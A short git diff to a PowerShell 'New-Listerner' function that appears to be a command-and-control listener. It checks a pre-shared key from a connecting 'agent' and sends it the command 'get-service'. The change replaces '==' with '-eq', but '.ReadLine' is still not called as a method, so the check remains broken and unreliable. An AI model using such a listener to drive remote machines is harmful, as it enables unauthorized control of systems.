@@ -77,7 +77,7 @@ Function Global:New-Listerner()
 				$StreamReader = New-Object System.IO.StreamReader($Stream)
 
 				# if PSK matches, payload
-				if($StreamReader.ReadLine == $PSK)
+				if($StreamReader.ReadLine -eq $PSK)
 				{
 					"new agent <3"
 					$StreamWriter.WriteLine("get-service") | Out-Null
